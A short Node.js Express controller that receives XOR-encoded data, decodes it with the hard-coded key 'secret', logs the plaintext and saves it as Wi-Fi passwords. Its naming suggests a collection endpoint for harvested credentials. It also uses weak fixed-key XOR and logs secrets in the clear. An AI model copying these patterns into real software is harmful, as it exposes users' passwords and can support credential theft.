const express = require("express");
const xorEncrypt = require("../functions/xorEncrypt");
const Password = require("../schema/wifi_passwords");

exports.getpasswords = async (req, res) => {
  try {
    const password = req.body.encrypted_data;
    
    const xorDecrypted = xorEncrypt(password, "secret");

    console.log("Decrypted data:", xorDecrypted);
    
    
    const newPassword = new Password({
      passwords: xorDecrypted,
      createdAt: new Date()
    });
    
    
    await newPassword.save();

   
    res.status(200).json({ message: "Password decrypted and saved successfully" });
  } catch (error) {
    console.error("Error saving password:", error);
    res.status(500).json({ message: "Error saving decrypted password" });
  }
};
